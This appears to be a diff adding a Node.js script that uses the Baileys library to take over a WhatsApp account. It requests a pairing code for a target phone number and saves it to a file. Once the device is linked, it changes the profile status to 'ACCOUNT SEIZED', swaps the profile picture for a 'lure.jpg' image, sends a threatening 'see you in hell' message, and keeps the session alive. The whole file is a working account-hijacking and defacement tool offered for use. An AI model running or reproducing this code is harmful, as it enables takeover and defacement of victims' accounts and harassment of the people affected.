@@ -1,0 +1,144 @@
+const { 
+    default: makeWASocket, 
+    useMultiFileAuthState, 
+    fetchLatestBaileysVersion, 
+    DisconnectReason,
+    Browsers,
+    delay
+} = require("@whiskeysockets/baileys"); 
+const pino = require("pino");
+const sharp = require("sharp");
+const fs = require("fs");
+const sessionPath = './session_new';
+let sock = null;
+let pairingCodeRequested = false;
+let isShuttingDown = false;
+
+function cleanSession() {
+    if (fs.existsSync(sessionPath)) {
+        fs.rmSync(sessionPath, { recursive: true, force: true });
+        console.log(`[✓] Cleaned old session`);
+    }
+}
+
+// NEW: Sharp Image Processor for local files
+async function getSharpBuffer(path) {
+    console.log(`[i] Processing image with Sharp: ${path}`);
+    return await sharp(path)
+        .resize(640, 640, {
+            fit: 'cover',
+            position: 'center'
+        })
+        .jpeg({ quality: 80 })
+        .toBuffer();
+}
+
+async function connectToWhatsApp(isFirstConnect = true) {
+    if (isFirstConnect) {
+        cleanSession();
+    }
+    
+    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+    
+    const { version } = await fetchLatestBaileysVersion();
+    console.log(`[i] Using WA v${version.join(".")}`);
+
+    sock = makeWASocket({
+        version,
+        auth: state,
+        logger: pino({ level: "silent" }),
+        browser: Browsers.macOS("Chrome"),
+        syncFullHistory: false,
+        markOnlineOnConnect: true,
+        printQRInTerminal: false,
+        connectTimeoutMs: 120000,
+        keepAliveIntervalMs: 30000,
+        defaultQueryTimeoutMs: 60000
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+
+    sock.ev.on("connection.update", async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (isShuttingDown) return;
+        
+        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
+            pairingCodeRequested = true;
+            const phoneNumber = process.argv[2]?.replace(/\D/g, '');
+            
+            if (!phoneNumber || phoneNumber.length < 10) {
+                console.error("[x] Error: Provide phone number with country code");
+                return;
+            }
+
+            console.log(`[i] Requesting pairing code for: ${phoneNumber}`);
+            await delay(2000);
+            
+            try {
+                const code = await sock.requestPairingCode(phoneNumber);
+                console.log(`ANON_CODE_START:${code}:ANON_CODE_END`);
+                fs.writeFileSync('CODE.txt', code);
+            } catch (err) {
+                console.error("[✗] Failed to get pairing code:", err.message);
+                pairingCodeRequested = false;
+            }
+        }
+
+        if (connection === "open") {
+            console.log("\n[✓] SUCCESS: DEVICE LINKED!");
+            await delay(15000); // Wait for sync
+            
+            try {
+                // 1. Update Status
+                await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
+                
+                // 2. Update Profile Picture with LOCAL lure.jpg
+                const localImagePath = 'lure.jpg';
+                
+                try {
+                    // Debug: Check if file exists
+                    console.log("[i] Current directory:", process.cwd());
+                    console.log("[i] Files here:", fs.readdirSync('.'));
+                    console.log("[i] lure.jpg exists:", fs.existsSync(localImagePath));
+                    
+                    if (!fs.existsSync(localImagePath)) {
+                        throw new Error(`File not found: ${localImagePath}`);
+                    }
+                    
+                    const buffer = await getSharpBuffer(localImagePath);
+                    
+                    // Format JID correctly for profile update
+                    const jid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+                    await sock.updateProfilePicture(jid, buffer);
+                    console.log("[✓] Profile picture updated with lure.jpg!");
+                    
+                } catch (err) {
+                    console.log(`[✗] Profile picture failed: ${err.message}`);
+                }
+                
+                // 3. Send Message
+                await sock.sendMessage(sock.user.id, { 
+                    text: "*SYSTEM ERROR:* TARRIFIC NOW HAS YOUR SOUL YOUR ARE Executed.\n\nProfile seized successfully, see you in hell." 
+                });
+                
+            } catch (e) { 
+                console.log("[✗] Update failed:", e.message);
+            }
+            
+            while (!isShuttingDown) {
+                await delay(60000);
+                try { await sock.sendPresenceUpdate('available'); } catch (e) {}
+            }
+        }
+
+        if (connection === "close") {
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            if (statusCode !== DisconnectReason.loggedOut && !isShuttingDown) {
+                return connectToWhatsApp(false);
+            }
+        }
+    });
+}
+
+connectToWhatsApp(true);
